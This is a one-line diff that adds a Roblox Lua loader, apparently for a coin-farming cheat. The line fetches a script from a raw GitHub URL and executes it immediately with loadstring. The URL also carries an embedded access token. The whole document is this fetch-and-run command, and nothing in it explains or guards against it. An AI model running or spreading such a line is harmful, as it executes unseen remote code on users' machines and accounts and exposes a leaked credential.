@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/AudaxiaEB/GrammyRobuc/main/CoinPlaneFarm?token=GHSAT0AAAAAABTENJKVKY2M6N2SRFJCXOYOYSHYEHA'),true))()
